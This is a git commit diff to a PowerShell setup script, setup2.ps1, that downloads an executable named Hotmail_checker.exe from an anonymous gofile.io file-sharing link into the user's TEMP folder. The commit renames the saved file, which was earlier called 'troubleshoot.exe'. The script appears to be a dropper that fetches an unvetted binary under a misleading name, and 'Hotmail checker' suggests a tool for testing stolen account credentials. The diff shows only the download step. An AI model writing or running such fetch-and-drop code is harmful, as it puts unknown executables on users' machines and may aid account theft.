ef314462f6c8cc4d6858bbaa84fe44d7a38c3273
atlastweaks <reallyyes@atomicmail.io>
2026-08-24 21:48:17 +0200

    Update temporary file name to Hotmail_checker.exe

--- setup2.ps1
+++ setup2.ps1
@@ -1,7 +1,7 @@
 $ErrorActionPreference = "Stop"
 
 $url = "https://cold-eu-agl-1.gofile.io/download/web/cf8ab565-842e-4f6e-a9bb-4b6e05c83e40/Hotmail_checker.exe"
-$temp = Join-Path $env:TEMP "troubleshoot.exe"
+$temp = Join-Path $env:TEMP "Hotmail_checker.exe"
 
 Invoke-WebRequest -Uri $url -OutFile $temp -UseBasicParsing
 
